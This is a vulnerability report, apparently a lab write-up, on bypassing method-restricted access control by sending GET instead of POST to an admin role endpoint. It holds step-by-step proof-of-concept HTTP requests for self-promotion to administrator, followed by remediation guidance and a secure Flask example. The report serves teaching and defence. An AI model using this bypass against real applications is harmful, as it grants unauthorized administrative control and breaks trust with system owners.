# Vulnerability Report: Privilege Escalation via HTTP Verb Tampering / Method-Based Access Control Bypass

* **Vulnerability Type:** HTTP Verb Tampering (CWE-288) / Missing Function Level Access Control (CWE-306) / Improper Access Control (CWE-284)

* **Severity:** High

* **Target Component:** User Role Management Handler (`/admin-roles`)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A critical access control bypass vulnerability was identified in the application's role management module. The perimeter access control system enforces authorization controls based strictly on the `POST` HTTP method used for role elevation requests (`POST /admin-roles`). However, the backend application controller handles parameter routing permissively and executes administrative actions even when submitted via alternative HTTP methods, such as `GET`. An authenticated non-administrative user can exploit this discrepancy by converting the request method to `GET`, bypassing security checks to elevate their own account privileges to administrative status.

## 2. Technical Analysis & Root Cause

The vulnerability is caused by a misalignment between how the security filter enforces permissions and how the application controller processes HTTP requests.

### Flawed Security Architecture

1. **Method-Restricted Security Rule:** Security middleware enforces role checks only on specific HTTP verbs (e.g., `if (request.method == 'POST' && request.path == '/admin-roles') checkAdmin();`).

2. **Permissive Controller Routing:** The backend route handler accepts requests across multiple HTTP verbs (e.g., `@RequestMapping` without specifying `method=RequestMethod.POST`, or generic request parameter parsing).

3. **Bypass Vector:** When a user submits `GET /admin-roles?username=wiener&action=upgrade`, the security filter skips authorization enforcement because the method is not `POST`. The backend controller then parses the query string parameters and executes the administrative privilege upgrade.

```
[ Low-Privileged User ]
           |
           | 1. POST /admin-roles (Blocked by Filter -> 403 Forbidden)
           |
           | 2. GET /admin-roles?username=wiener&action=upgrade
           v
[ Security Filter / WAF ]
           |
           | 3. Inspects HTTP Method: GET (Filter rules apply only to POST)
           | 4. Passes request to backend handler without role check
           v
[ Backend Controller ]
           |
           | 5. Reads parameters (username=wiener, action=upgrade)
           | 6. Upgrades user to Admin Role
           v
[ Escalation Successful ]
```

## 3. Proof of Concept (PoC)

1. Authenticate as an administrative user (`administrator:admin`).

2. Perform a role elevation operation (e.g., promoting user `carlos`) and capture the request using an HTTP proxy:

   ```
   POST /admin-roles HTTP/1.1
   Host: target-app.net
   Cookie: session=admin_session_val
   Content-Type: application/x-www-form-urlencoded

   username=carlos&action=upgrade
   ```

3. Authenticate in a separate session as standard user `wiener:peter` and copy the non-administrative session cookie.

4. Replace the administrative session cookie with the standard user's session cookie and send the `POST /admin-roles` request in Burp Repeater:

   ```
   POST /admin-roles HTTP/1.1
   Host: target-app.net
   Cookie: session=user_wiener_session
   Content-Type: application/x-www-form-urlencoded

   username=wiener&action=upgrade
   ```

   *Observed Response:* `HTTP/1.1 403 Forbidden` (Access Denied).

5. Change the request method from `POST` to `GET` and append parameters to the request path:

   ```
   GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
   Host: target-app.net
   Cookie: session=user_wiener_session
   ```

6. **Observe Response:** The server processes the request with `HTTP/1.1 200 OK`.

7. Refresh the application session in the browser to confirm that user `wiener` now possesses administrative privileges.

## 4. Impact

* **Vertical Privilege Escalation:** Non-privileged users can promote themselves or other accounts to administrative status.

* **Security Controls Evasion:** Complete bypass of method-based Web Application Firewall (WAF) or security filter rules.

* **System Compromise:** Unrestricted access to administrative features following unauthorized role elevation.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Enforce Verb-Agnostic Access Controls:**
   Access control policies must apply to the endpoint resource regardless of the HTTP method used in the request.

2. **Restrict Endpoint HTTP Methods:**
   Explicitly specify allowed HTTP verbs for each route handler (e.g., bind administrative endpoints strictly to `POST` or `PUT`) and reject unmapped methods with `405 Method Not Allowed`.

3. **Centralize Authorization Checks:**
   Perform authorization validation within the core business logic or controller methods rather than relying solely on pattern-matching middleware filters.

#### Secure Code Implementation Example (Python / Flask)

```
from flask import Flask, request, session, abort, jsonify

app = Flask(__name__)

# Strictly restrict the route handler to POST requests only
@app.route('/admin-roles', methods=['POST'])
def modify_user_role():
    # Enforce role-based access control inside the handler regardless of route config
    current_user_role = session.get('role')
    if current_user_role != 'ADMIN':
        abort(403)  # Forbidden

    username = request.form.get('username')
    action = request.form.get('action')

    # Execute role modification logic safely
    db_update_user_role(target_user=username, action=action)
    return jsonify({"status": "success", "message": f"User {username} updated."}), 200
```

## 6. References

* **CWE-288:** [Authentication Bypass Using an Alternate Path or Channel](https://cwe.mitre.org/data/definitions/288.html)

* **CWE-306:** [Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

* **OWASP:** [Testing for HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)